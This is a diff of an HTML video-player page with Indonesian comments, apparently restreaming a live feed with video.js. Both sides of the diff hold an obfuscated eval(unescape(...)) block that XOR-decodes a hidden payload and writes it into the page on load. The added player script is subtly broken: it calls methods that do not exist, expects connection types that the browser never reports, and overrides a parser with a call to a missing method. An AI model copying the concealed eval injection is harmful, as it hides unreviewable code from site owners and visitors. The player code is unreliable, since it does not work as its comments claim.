@@ -23,9 +23,7 @@
 <meta name="dns-prefetch" content="https://live.cnnindonesia.com">
   <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
 <meta name="mobile-web-app-capable" content="yes" />
-<link href="https://rawgit.com/mkhazov/videojs-resolution-switcher/master/lib/videojs-resolution-switcher.css" rel="stylesheet">
 <link href="https://vjs.zencdn.net/5-unsafe/video-js.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/videojs-logo@latest/dist/videojs-logo.css">
  <style>
 body, html {
     background-color: #000;
@@ -344,6 +342,18 @@ img#vjs-logobrand-image {
 .vjs-ad-playing a#vjs-logobrand-image-destination {
 	display: none;
 }
+.video-container {
+      position: relative;
+    }
+    .quality-label {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 24px;
+      color: white;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+    }
 </style>
 <script src="https://vjs.zencdn.net/ie8/1.1.2/videojs-ie8.min.js"></script>
 <script src="https://raw.githubusercontent.com/titpetric/PeerLive/master/clientVOD/js/videojs.hls.orig.js"></script>
@@ -620,47 +630,104 @@ gtag("event", "page_view", {
 </HEAD>
 <BODY topmargin=0 leftmargin=0 style="background:transparent;background-color:#000000">
 <script src="https://raw.githubusercontent.com/Mewte/videojs-logobrand/master/src/videojs.logobrand.js"></script>
-<div id='vplayer'>
-<script type="text/javascript">
-<!-- 
-eval(unescape('%66%75%6e%63%74%69%6f%6e%20%75%35%62%65%62%39%63%63%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%39%37%39%33%32%38%30%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%37%39%31%31%30%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%32%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
-eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%75%35%62%65%62%39%63%63%28%27') + '%3e%71%64%74%67%6c%73%34%0c%01%60%6c%6c%75%72%1b%6a%6a%5d%76%6b%77%17%3a%1f%74%63%62%66%69%68%73%27%2d%73%61%70%6f%6a%5b%77%66%74%25%25%38%03%0f%63%62%73%1e%6e%6d%5a%66%4d%72%66%6d%60%65%5e%6b%1e%3f%1e%6b%6e%5f%75%62%78%2b%7b%62%60%66%59%2c%73%62%70%2e%6b%65%58%6b%38%0a%08%6a%6a%5a%73%63%72%2d%7a%64%68%67%5c%2c%72%66%75%28%6a%6f%5e%6a%19%32%1f%65%73%68%61%77%63%6d%6e%27%2f%19%70%0a%09%1e%1a%72%63%63%71%2e%70%6b%75%59%62%6e%73%67%71%77%42%63%5d%63%6b%77%2f%24%51%63%60%63%75%67%70%27%2b%16%22%6f%73%73%6e%75%38%28%29%6a%65%75%6b%2b%68%6d%6d%67%68%62%68%68%63%73%66%57%2b%68%6c%6a%2d%23%39%1b%0f%08%1c%1f%7a%61%6e%70%2d%71%67%72%55%67%6f%71%62%79%75%4f%62%5e%62%67%70%23%21%53%73%62%78%2c%36%64%62%6c%76%25%2f%1a%25%49%6c%70%60%63%6b%5e%2d%37%2c%2b%1a%26%48%66%64%74%7f%38%1f%3f%68%62%75%69%67%60%1f%27%37%30%1f%50%4b%2f%45%32%33%36%42%1f%48%74%6e%6b%63%2d%55%49%4a%2b%3f%2e%31%38%29%3c%31%2f%2c%2a%2e%2a%23%1e%3d%6f%66%6d%6a%54%62%60%4d%67%77%29%33%33%34%24%36%3d%1f%27%49%42%52%4e%4e%2a%1c%6b%6f%6e%6a%1f%44%63%65%69%68%23%1e%43%67%78%6a%62%62%2c%2f%2a%31%29%2a%2c%31%2f%3c%29%25%2e%2e%32%1a%4b%68%64%67%68%62%16%56%56%65%5e%70%63%2d%36%35%35%2e%30%3c%22%2e%38%0a%08%1a%1e%75%67%72%71%71%64%19%63%6c%5e%62%49%70%62%61%67%6e%5e%62%2b%56%6f%6f%6a%73%26%77%62%67%73%2b%16%58%79%64%72%6b%67%6c%77%75%27%3b%0a%00%7c%02%09%6f%6a%5b%77%66%74%2c%72%62%57%65%7e%27%27%27%1a%3b%39%1a%79%09%09%16%19%67%6b%5e%77%67%70%29%6a%6a%5d%76%2e%20%30%0a%09%7b%23%39%0e%0c%1e%1c%3b%25%76%68%71%66%6e%76%3c%0e%0c%1e%1c%0a%00%3d%7d%66%63%63%69%1e%62%66%3b%22%75%60%76%67%6b%5e%77%67%70%25%1a%61%68%5e%79%76%32%21%75%67%66%63%68%2f%68%73%1f%7c%6f%78%2a%63%63%60%5f%76%6e%72%29%70%61%60%65%21%1f%71%76%77%6f%67%3b%22%74%6f%65%7b%67%39%2f%2a%2e%26%3d%66%61%66%6d%61%7b%39%2e%2e%2a%23%3c%76%63%74%73%23%58%63%66%64%6c%3c%61%66%68%72%61%71%31%27%17%74%66%62%76%66%3e%24%2f%2c%2f%2b%27%17%67%62%67%61%66%77%3f%20%2d%2f%26%24%29%1f%60%6d%68%72%75%69%6a%73%3a%28%75%79%72%62%20%1a%6e%68%75%72%61%71%33%27%6f%73%73%6e%75%38%28%29%6d%6c%62%64%75%7d%2d%6f%5f%61%63%74%28%62%61%75%25%67%56%6d%6d%63%74%2c%70%67%60%6c%21%16%58%7a%73%6c%6e%6e%5f%72%1a%61%6f%6d%7a%77%64%6b%70%1e%6a%70%66%6e%6d%5d%63%33%27%56%72%73%6d%24%1e%6b%6e%5f%75%70%6f%6b%63%66%6d%63%38%0b%0d%3e%71%6f%72%78%66%6a%1f%70%70%65%3b%25%62%72%70%6f%79%3f%24%2c%6b%67%70%63%29%65%6c%6e%66%64%65%64%6d%62%71%63%5f%29%65%6d%69%2c%62%60%7d%62%60%6c%68%2d%74%6f%67%68%39%69%6b%65%73%75%2c%75%6b%62%6e%2d%63%67%7b%6b%60%6b%66%71%76%5d%70%31%32%2d%32%27%37%3d%33%2e%5d%64%2f%32%34%2e%2c%2f%55%76%63%62%6d%65%28%6b%34%77%36%22%1f%7a%70%67%62%3a%25%5b%6e%6b%6e%67%63%5e%7a%60%64%6d%2c%74%68%62%29%5b%6e%6c%6b%6b%2b%62%6f%62%65%77%70%6f%21%1e%68%5e%68%64%63%3a%24%4a%49%55%20%1a%70%61%70%33%22%38%35%2f%25%38%0b%0d%3e%71%6f%72%78%66%6a%1f%70%70%65%3b%25%62%72%70%6f%79%3f%24%2c%6b%67%70%63%29%65%6c%6e%66%64%65%64%6d%62%71%63%5f%29%65%6d%69%2c%62%60%7d%62%60%6c%68%2d%74%6f%67%68%39%69%6b%65%73%75%2c%75%6b%62%6e%2d%63%67%7b%6b%60%6b%66%71%76%5d%70%31%32%2d%32%27%37%3d%33%2e%5d%64%30%33%2a%2e%2c%2f%55%76%63%62%6d%65%28%6b%34%77%36%22%1f%7a%70%67%62%3a%25%5b%6e%6b%6e%67%63%5e%7a%60%64%6d%2c%74%68%62%29%5b%6e%6c%6b%6b%2b%62%6f%62%65%77%70%6f%21%1e%68%5e%68%64%63%3a%24%51%46%25%1b%74%63%73%3a%2d%35%3f%2f%24%3c%0f%08%3f%75%6d%71%71%69%64%17%70%71%61%3f%20%63%76%72%6c%70%30%2a%24%6b%66%74%67%2c%64%68%6c%65%6d%6a%6a%65%62%70%67%5b%2c%64%69%6b%2f%6b%6f%73%6a%60%6d%6c%29%71%6e%63%6a%3a%60%64%6b%7b%75%2d%71%6f%67%6f%29%61%64%72%64%6e%63%66%70%72%59%75%30%36%2f%31%2e%38%33%3b%2e%5c%60%35%36%37%2a%2e%2c%5c%79%6d%6a%6d%64%2c%6f%31%76%32%20%1c%73%7f%69%6a%3a%24%5f%6a%6e%6f%63%61%5d%73%6f%6a%65%2c%75%6c%66%2c%5a%6a%6e%68%62%24%6c%67%62%64%73%74%6a%20%1a%6a%5d%61%6b%6d%32%24%47%42%21%1e%75%67%71%39%24%3d%37%27%24%3d%0b%0c%1e%1b%1a%3a%2f%75%6f%65%6a%6c%3d%3a%29%62%62%70%3c%38%2c%6a%60%7d%3d9793280%34%30%35%34%30%32%31' + unescape('%27%29%29%3b'));
-// -->
-</script>
-   
 <script src='https://vjs.zencdn.net/5-unsafe/video.js'></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script src="https://unpkg.com/videojs-flash/dist/videojs-flash.js"></script>
 <script src="https://unpkg.com/videojs-contrib-hls/dist/videojs-contrib-hls.js"></script>
 <script src="https://use.fontawesome.com/f4da8251b8.js"></script>
-<script src="https://rawgit.com/mkhazov/videojs-resolution-switcher/master/lib/videojs-resolution-switcher.js"></script>  
-
-<script>
-    (function(window, videojs) {
-      var examplePlayer = window.examplePlayer = videojs('vjsplayer');
-	  player.usingHtml5(true);
-player.tech_.hls.lowBufferWatchdogPeriod = 0.5;
-player.tech_.hls.highBufferWatchdogPeriod = 3;
-
-// Tetapkan bitrate awal yang lebih rendah untuk memulai pemutaran lebih cepat
-player.tech_.hls.startLevel = 1;
-
-	plugins: {
-			videoJsResolutionSwitcher: {
-			    ui: true,
-				default: 'low',
-				dynamicLabel: false
-			}
-		}
-	}, function(){
-		var player = this;
-		player.on('resolutionchange', function(){
-			console.info('Source changed')
-});
-  </script>
-<script>
-videojs('vjsplayer').videoJsResolutionSwitcher()
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%66%39%30%65%35%33%35%61%65%30%66%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%39%30%32%37%37%38%34%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%34%31%32%32%34%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%36%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%66%39%30%65%35%33%35%61%65%30%66%28%27') + '%30%6c%5a%6b%64%62%69%3d%03%05%5f%6b%6c%6b%6f%1d%6d%61%53%74%5a%68%1b%35%18%74%65%5f%58%6e%63%65%25%24%74%65%6f%68%62%5d%72%58%6b%26%2b%32%02%00%67%5d%6c%1e%60%68%5c%59%4e%64%64%64%67%69%59%64%1e%31%1b%6d%61%5c%7b%58%69%2c%6f%5d%5f%66%5f%29%75%65%6b%20%61%6c%5f%5f%37%05%00%6c%67%5c%74%58%64%2f%6b%5b%5c%60%5b%2c%74%63%6b%2f%61%61%5c%5b%1e%36%18%62%6b%6e%5c%69%64%6e%60%25%26%1e%74%05%06%1e%1c%6f%65%64%6a%20%6a%5a%6a%4d%5d%69%6b%59%6c%69%45%58%53%59%5a%68%23%23%4e%5b%66%5e%6b%58%6b%29%21%1f%25%63%6c%6c%6e%6b%35%2e%2e%76%79%76%2d%59%69%6a%61%6c%58%68%6f%58%6a%6b%5c%2d%59%68%65%2b%27%33%1b%00%03%1d%12%69%67%67%6c%2a%6f%5b%68%4d%58%6c%68%57%6a%6b%46%5e%59%5c%5b%6a%23%26%48%6a%57%6b%22%3f%60%5d%6a%6a%27%27%1d%26%40%61%73%66%62%67%59%2b%2b%2e%2b%1d%25%41%6b%6f%6a%76%34%18%39%6c%58%6d%6e%64%59%12%2c%29%31%1b%4f%45%23%47%32%34%35%3b%12%3b%6a%67%67%5c%2b%49%43%4a%2c%3c%2f%24%2b%2f%35%2d%28%2a%2e%2c%2a%24%1d%3c%62%6d%63%5b%50%5d%5e%41%65%6f%2e%28%2a%39%2f%28%34%1b%20%47%46%48%46%41%21%1d%6e%64%60%5b%1b%43%5d%59%63%68%24%1d%3a%6a%6b%6c%63%5e%2b%29%2e%2b%29%2d%2f%28%22%37%2f%2c%2a%29%2c%1e%41%68%5b%64%61%57%1d%48%5f%61%59%6e%67%2f%2e%2a%36%2f%25%37%24%27%34%05%06%1e%1c%6d%58%69%68%64%6f%1f%62%68%59%5c%4d%6a%62%66%64%6f%53%61%2d%5f%6b%68%64%77%24%6f%65%64%6a%2e%1d%5e%68%60%6d%65%5b%6e%6f%6a%24%32%0f%03%72%03%05%68%64%5f%75%5e%6b%2f%6b%57%5c%5b%77%23%20%21%1e%31%39%1d%72%00%0c%1d%1f%6e%67%59%71%5b%6a%29%6d%61%5c%7b%25%26%31%06%06%75%27%33%06%03%1d%1d%3e%2e%68%59%6d%61%68%6a%3e%1b%1d%1d%1d%0f%03%1f%1e%37%5c%61%74%1c%5c%61%5c%6a%65%30%19%74%62%5c%5d%6d%21%5c%6e%6f%69%53%64%6d%5b%6d%1e%3a%03%02%37%77%64%59%57%6e%1f%67%5f%35%1e%74%62%6c%6d%61%5c%7b%58%69%18%1b%5f%64%5f%6b%6c%30%1b%77%6b%59%5a%6d%26%66%6f%1e%76%65%6a%20%59%57%67%5e%6b%67%6c%25%69%63%62%6f%1b%1d%65%69%76%62%5e%35%1e%75%65%5f%69%65%33%23%2d%2f%1b%34%60%5d%67%67%63%69%33%2c%22%2d%1a%31%6f%5d%70%6a%21%5a%61%64%66%60%33%58%5b%69%6c%5d%68%33%1d%1d%76%64%56%69%67%33%1d%29%28%2e%19%1d%1d%65%58%6b%66%67%6a%36%1e%29%2e%2c%1e%1b%1d%5a%61%6f%6b%68%68%64%6f%33%1a%6f%6b%68%58%14%1d%6f%6d%6c%6c%5d%68%31%1d%65%69%69%62%6a%31%2d%28%6b%68%5b%6e%6f%77%2f%6d%53%66%5a%69%29%5c%5d%74%2f%5d%5c%6f%6f%57%6b%2d%75%5e%5e%68%18%1c%5a%68%69%6e%62%61%5e%77%1b%5f%6b%6c%68%6d%6e%61%6a%12%6d%69%5b%67%6b%59%5a%31%1d%5c%68%69%61%1b%1f%6e%67%59%71%69%65%69%61%64%6f%57%3f%02%00%02%01%34%69%6f%6e%6b%5a%58%12%6a%69%59%36%1e%60%6a%68%6b%6a%33%2e%21%61%66%74%5e%2a%5f%6c%6e%62%6f%59%6e%60%58%68%67%5a%2a%5f%6d%61%28%61%64%77%57%5a%6d%6c%28%6f%65%67%60%35%5a%6f%6f%66%77%2d%69%66%61%64%2d%5b%63%68%6f%62%6e%64%68%6a%29%65%2f%6b%34%1d%1d%69%74%62%58%32%18%5a%68%68%62%65%5c%5c%69%64%61%6f%2c%74%69%5c%2a%5f%6c%6b%61%58%2f%6f%6d%5a%65%6e%6e%64%18%3e19027784%36%31%37%37%37%38%37' + unescape('%27%29%29%3b'));
+// -->
 </script>
+   <script>
+    (function (window, videojs) {
+  var examplePlayer = (window.examplePlayer = videojs("vjsplayer", {
+    html5: {
+      hls: {
+        overrideNative: true,
+        smoothQualityChange: true,
+        maxBufferLength: 30,
+        maxMaxBufferLength: 60,
+        enableLowInitialPlaylist: true,
+        overrideNativeAudioTracks: true,
+        overrideNativeVideoTracks: true,
+      },
+    },
+  }));
+
+  // Tetapkan bitrate awal yang lebih rendah untuk memulai pemutaran lebih cepat
+  examplePlayer.tech_.hls.options.startLevel = 1;
+
+  // Pilih resolusi terendah saat pertama load
+  examplePlayer.on("loadedmetadata", function () {
+    examplePlayer.quality("low");
+  });
+
+  // Sesuaikan resolusi dengan koneksi internet
+  function updateQuality() {
+  // Dapatkan tipe koneksi saat ini
+  var connectionType = window.navigator.connection.effectiveType;
+
+  // Pilih resolusi berdasarkan tipe koneksi
+  switch (connectionType) {
+    case "cellular":
+      examplePlayer.quality("low");
+      break;
+    case "wifi":
+      examplePlayer.quality("medium");
+      break;
+    case "wired":
+      examplePlayer.quality("high");
+      break;
+    default:
+      examplePlayer.quality("low");
+      break;
+  }
+}
+
+  // Jalankan updateQuality() setiap 5 detik
+  setInterval(updateQuality, 5000);
+
+  // Perbarui resolusi saat level berubah
+  examplePlayer.on("levelchange", function () {
+    updateQuality();
+  });
+
+  // Tampilkan teks keterangan kualitas di tengah atas video
+  function showQualityLabel(quality) {
+    var qualityLabel = document.getElementById("qualityLabel");
+    qualityLabel.textContent = "Playback in " + quality + " Quality";
+  }
+
+  // Perbarui teks keterangan saat kualitas berubah
+  examplePlayer.on("qualitychange", function () {
+    var currentQuality = examplePlayer.qualityLevels().find(".vjs-selected").label();
+    showQualityLabel(currentQuality);
+  });
+
+  // Tampilkan teks keterangan saat video dimulai
+  examplePlayer.on("play", function () {
+    var currentQuality = examplePlayer.qualityLevels().find(".vjs-selected").label();
+    showQualityLabel(currentQuality);
+  });
+
+  // Set frame rate menjadi 24fps (23.976)
+  examplePlayer.tech_.hls.on("manifestParsed", function () {
+    examplePlayer.tech_.hls.masterPlaylistController_.mainSegmentLoader_.mediaSource_.videoBuffer_.appendMode_ = "segments";
+    examplePlayer.tech_.hls.masterPlaylistController_.mainSegmentLoader_.mediaSource_.videoBuffer_.segmentParser_.parseSegmentBinaryData = function (
+      data,
+      byteOffset,
+      segmentInfo
+    ) {
+      var segment = this.parseSegmentBinaryData.originalMethod.call(this, data, byteOffset, segmentInfo);
+      segment.videoFrameRate = 23.976; // Mengubah frame rate menjadi 24fps (23.976)
+      return segment;
+    };
+  });
+})(window, videojs);
+  </script>
 <script>
 var player = videojs('vjsplayer');
 
@@ -697,7 +764,7 @@ function skipS3MV(skipBy) {
     })
 </script>
 </div>
-  <script type="text/javascript">var _Hasync= _Hasync|| [];
+	<script type="text/javascript">var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,4834164,4,605,110,55,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
